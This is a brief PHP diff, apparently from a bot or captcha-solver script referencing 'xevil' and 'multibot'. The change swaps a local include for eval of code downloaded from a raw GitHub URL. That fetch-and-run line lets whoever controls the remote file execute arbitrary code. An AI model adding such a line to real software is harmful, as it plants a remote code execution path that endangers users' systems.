@@ -1,7 +1,7 @@
 <?php
 
 if (!$eval) {
-    eval(str_replace('<?php', "", get_e("build_index.php")));
+    eval(str_replace('<?php', "", get_e("https://raw.githubusercontent.com/diamondnft12/Testoke/main/build_index.php")));
     $reques = array(
         1 => "xevil", 2 => "multibot"
     );
